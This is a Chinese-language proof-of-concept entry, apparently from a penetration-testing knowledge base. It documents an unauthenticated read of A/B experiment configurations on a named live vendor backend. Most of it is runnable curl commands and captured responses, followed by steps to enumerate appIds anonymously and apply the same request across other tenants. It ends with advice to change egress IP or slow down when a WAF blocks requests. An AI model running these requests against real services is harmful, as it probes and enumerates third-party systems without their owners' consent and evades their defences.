# light-tech Sparrow 后台 GET /api/ab-test/{appId} 未鉴权读取 A/B 实验配置（同路由写方法均 401）

- **code**: sparrow-light-tech-ab-test-appid-unauth-read-get
- **kind**: poc
- **category**: unauthorized
- **component**: light-tech Sparrow（Node/Express + MongoDB，Wix 第三方应用共用后端）
- **severity**: low
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: task#10 / finding_id=156（finding_checks.verdict=verified，findings.status=confirmed），2026-11-11 19:44–19:52 UTC，本机 Linux curl -sk -A $ARTEX_UA 直连 sparrow-captain-sparrow.light-tech.online：① 无任何鉴权头 GET /api/ab-test/13bd99dc-f4a5-207a-0b7d-6c95f09cc302 → HTTP 200，content-length 341，JSON 数组 2 条（name="Different premium windows test"/key=prem-windows、name="Show watermark after the end of the trial"/key=watermark，均带 appId 与 percentage=0）；② 同 URL HEAD → 401 {"error":"Unauthorized"}，POST /api/ab-test/ 与 POST /api/ab-test/{appId} → 401/24，PUT/PATCH/DELETE /api/ab-test/{appId}/{key} → 401/24（key 不存在也先鉴权）；③ 三态对照（无鉴权 / 本站 Wix 公开实例令牌 / 垃圾 Bearer）均 200/341B 字节一致 → 接口完全不校验令牌；④ 6 个 appId 逐个 GET，仅 Slideshow 返回 341B，其余 5 个 200 空数组（len=2）。原始响应落盘 /opt/artex/data/tasks/10/i2413/{ab_slideshow.json,ab_*.json,route_matrix.csv,summary.md}。判定成立：非 GET 方法全部强制 admin Bearer，仅 GET 漏挂鉴权 —— 方法级鉴权漏配而非公开设计。
- **path**: pocs/sparrow-light-tech-ab-test-appid-unauth-read-get/sparrow_light_tech_ab_test_unauth_read.md
- **tags**: unauthorized, sparrow, light-tech, wix, ab-test, abtest, method-level-auth, mongodb, info-leak, no-auth
- **created_at**: 2026-11-11T19:51:21.785Z
- **engine**: https://sparrow-captain-sparrow.light-tech.online
- **found_by**: internal

## 描述

Sparrow 后台把 A/B 实验配置的读接口放在鉴权中间件之外：GET /api/ab-test/{appId} 不校验任何令牌，匿名返回该应用全部内部实验定义（name/key/appId/percentage）。同一路由的 HEAD/POST/PUT/PATCH/DELETE 全部 401 要求 Sparrow admin（Google OAuth）Bearer，且 3 种令牌三态对照响应字节一致，证明是方法级漏配而非公开设计。泄露内容不含 PII/密钥，属内部配置信息泄露，严重度 low；价值在于为同供应商多租户后端提供又一条零凭据只读面，可配合 /api/applications 拿 appId 横向枚举。

## 用法

```
1) 取 appId（同服务匿名可读）：curl -sk -A "$UA" https://sparrow-<tenant>.light-tech.online/api/applications → 200 JSON 数组，元素里的 appId 即 Wix appDefId（例如站点菜单应用 = 14206e6f-4e6d-eecd-f424-86531c98386c）。
2) 读实验配置：curl -sk -A "$UA" https://<host>/api/ab-test/<appId> → 200 + JSON 数组；判据 = 每条含 name/key/appId/percentage/__v/_id。
3) 证明是方法级漏配（必须做，否则会把公开读当漏洞）：同 URL 发 HEAD → 401 {"error":"Unauthorized"}；POST /api/ab-test/ 与 POST /api/ab-test/<appId> → 401；PUT/PATCH/DELETE /api/ab-test/<appId>/<key>（key 可随便填）→ 401。
4) 令牌三态对照：无鉴权 / 站点公开 Wix instance 令牌 / 垃圾 Bearer，三次响应长度与字节应完全一致（均 200/341B）→ 排除"某类令牌即可读"。
5) 批量枚举时把空数组算作"该应用无实验配置"，不是失败；别把 200 [] 记成泄露。
注意：只读，不要尝试写（写方法全部 401，硬试只会触发风控）；数据无 PII，报告按信息泄露定级 low。
```

## 正文

```
# light-tech Sparrow 后台 GET /api/ab-test/{appId} 未鉴权读取 A/B 实验配置

## 前置条件
- 目标为 light-tech 的 Sparrow 后端，公网可达，域名形如 `sparrow-<tenant>.light-tech.online`（本例 `sparrow-captain-sparrow.light-tech.online`）。
- 无需账号 / Cookie / Bearer / 任何令牌；`curl -sk` 即可。
- 后端栈特征：Node/Express + MongoDB（响应含 `_id` 24 位 ObjectId 与 `__v`）。
- `appId` 就是 Wix 的 `appDefId`，可从同服务的匿名注册表取。
- 同族背景：该后端还承载 `/api/applications`（匿名增删）与 `/api/applications/<appId>/emails`（匿名写订阅邮箱），见知识库条目 `sparrow-light-tech-api-applications-emails-unauth-write`；认证面只有 Google OAuth，无本地账号，见 `light-tech-sparrow-后台管理身份面-google-oauth-only-jwt-弱密钥-alg-n`。

## 0) 先拿 appId（匿名）
```bash
curl -sk -A "$UA" "https://<host>/api/applications"
```
期望 200，JSON 数组，元素含 `name` / `appId` / `color`。任取其一。

## 1) 主请求：未鉴权读 A/B 实验配置
```bash
curl -sk -A "$UA" "https://<host>/api/ab-test/<appId>"
```
实测（appId=`13bd99dc-f4a5-207a-0b7d-6c95f09cc302`，Slideshow 应用）：
```
HTTP/2 200
content-type: application/json
content-length: 341
```
```json
[
  {"_id":"68ca7ef4caf0e3ace83d0590","name":"Different premium windows test",
   "key":"prem-windows","appId":"13bd99dc-f4a5-207a-0b7d-6c95f09cc302","percentage":0,"__v":0},
  {"_id":"697c6dd0c8f986e3b3a08aa4","name":"Show watermark after the end of the trial",
   "key":"watermark","appId":"13bd99dc-f4a5-207a-0b7d-6c95f09cc302","percentage":0,"__v":0}
]
```
**命中判据**：无 `Authorization` 头仍 HTTP 200，且数组元素含 `name` + `key` + `appId` + `percentage` + Mongo `_id`。
（字段名为 `percentage`，不是被中间层篡改过的形态。）

## 2) 方法级对照：证明是漏挂而非公开设计
```bash
# 2.1 同 URL HEAD
curl -sk -A "$UA" -I "https://<host>/api/ab-test/<appId>"
# → HTTP/2 401, {"error":"Unauthorized"}（body 被 HEAD 截断）

# 2.2 创建
curl -sk -A "$UA" -X POST "https://<host>/api/ab-test/" \
  -H 'Content-Type: application/json' -d '{}'
# → 401 {"error":"Unauthorized"}
curl -sk -A "$UA" -X POST "https://<host>/api/ab-test/<appId>" \
  -H 'Content-Type: application/json' -d '{}'
# → 401 {"error":"Unauthorized"}

# 2.3 改 / 删（key 故意填不存在的值，仍然先鉴权）
curl -sk -A "$UA" -X PUT "https://<host>/api/ab-test/<appId>/<任意key>" \
  -H 'Content-Type: application/json' -d '{"percentage":1}'
curl -sk -A "$UA" -X PATCH "https://<host>/api/ab-test/<appId>/<任意key>" \
  -H 'Content-Type: application/json' -d '{"percentage":1}'
curl -sk -A "$UA" -X DELETE "https://<host>/api/ab-test/<appId>/<任意key>" \
  -H 'Content-Type: application/json' -d '{"percentage":1}'
# → 全部 401 {"error":"Unauthorized"}（content-length 24）
```
判读：所有非 GET 方法（含 HEAD）都先过 admin Bearer 中间件，唯独 GET 放行 → 方法级鉴权漏配。

## 3) 令牌三态对照：排除「某种令牌即可读」
对同一 GET 分别发送：
1. 不带任何头；
2. 站点公开 Wix instance 令牌（`/_api/v1/access-tokens` 取出的 `apps[<appDefId>].instance`）；
3. 垃圾 Bearer（如 `Authorization: Bearer test`）。

实测三者均 **200 / 341B，且响应字节完全一致** → 该 GET 路径完全不读鉴权头。

## 4) 覆盖范围（避免把空数组当失败）
对 `/api/applications` 返回的 6 个 appId 逐个 GET：
| 应用 | 响应 |
|---|---|
| Slideshow (`13bd99dc-…f09cc302`) | 200, 341B, 2 条实验 |
| Interactive section | 200, `[]` (len=2) |
| Site menu (`14206e6f-…531c98386c`) | 200, `[]` |
| Hover effects | 200, `[]` |
| Welcome bar | 200, `[]` |
| Size chart | 200, `[]` |

判读：`200 []` = 该应用无实验配置；泄露范围以各应用实际配置为限。

## 影响与定级
- 泄露：内部实验名称、实验 key、分流百分比、appId（Mongo ObjectId）。
- 不含 PII、邮箱、密钥、令牌；不能写入（写方法 401）。因此定级 **low / 内部配置信息泄露**。
- 横向价值：同供应商多租户后端，任意 `sparrow-*.light-tech.online` 租户都可套同一请求；`appId` 可由匿名 `/api/applications` 直接获得，枚举成本为零。

## 失败时常见原因
- **GET 也返回 401** → 该租户已修复/升级；换其他 `sparrow-*` 租户验证是否面级差异。
- **404** → 路由或版本变更；从 Sparrow 后台前端 bundle 重新提取 base URL 与路由前缀。
- **200 但 `[]`** → 该 appId 没有 A/B 实验，不是接口失效；换应用或换租户。
- **403 / 超时** → CDN/WAF 按出口 IP 拦截，换出口或降频。
- **用 HEAD 判定时读到空 body** → HEAD 本身被 401 截断，这是预期行为，不要误判为"接口挂了"。

## 原始证据落盘（本机）
`/opt/artex/data/tasks/10/i2413/{ab_slideshow.json,ab_*.json,route_matrix.csv,summary.md}`，2026-11-11 19:44–19:52 UTC，`curl -sk -A "$ARTEX_UA"`。
```
